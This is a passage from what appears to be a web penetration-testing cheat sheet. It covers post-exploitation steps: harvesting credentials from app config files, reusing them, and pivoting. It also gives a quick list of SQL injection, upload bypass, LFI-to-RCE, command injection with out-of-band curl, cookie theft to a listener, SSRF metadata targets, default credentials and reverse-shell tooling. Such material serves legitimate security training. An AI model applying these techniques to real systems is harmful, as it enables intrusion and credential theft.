/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

---

## 18. Post-exploitation hand-off

Once you have a shell from the web:

1. `id; hostname; uname -a; whoami` — confirm.
2. Look for in-app creds: `/var/www/html/*/config.php`, `wp-config.php`, `.env`, `appsettings.json`, `web.config`.
3. Reuse those creds for `su <user>`, SSH, MySQL.
4. Pivot to → [Linux-Priv-Esc.md](Linux-Priv-Esc.md) or [Windows-Priv-Esc.md](Windows-Priv-Esc.md).

---

## 19. Cheat — one-page recall

```
nmap -p- --min-rate 5000 → -sCV on found → add SAN+redirects to /etc/hosts
robots.txt, view-source, /.git, /.env, /backup.zip
whatweb / cookie → stack → searchsploit
feroxbuster -x php,txt,bak,zip
ffuf vhost  (-fs baseline)
ffuf param-name fuzz
SQLi: ' " ` \ ;-- OR 1=1 → sqlmap -r req.txt --batch --dbs
Upload: .phtml .phar .php5 / GIF89a magic / Content-Type swap / .htaccess
LFI: ../../etc/passwd → php://filter base64 → log poisoning → RCE
Cmd inj: ; | & && $() `` %0a → ${IFS} bypass → OOB curl
XSS: marker → context → cookie steal to listener
SSRF: 127.0.0.1, 169.254.169.254, file://, gopher://
Default creds: admin/admin, tomcat/tomcat, sa/sa
Shell: pentestmonkey php-reverse-shell.php / msfvenom -f aspx,war
Stabilize: python pty → Ctrl-Z → stty raw -echo; fg → export TERM=xterm
```
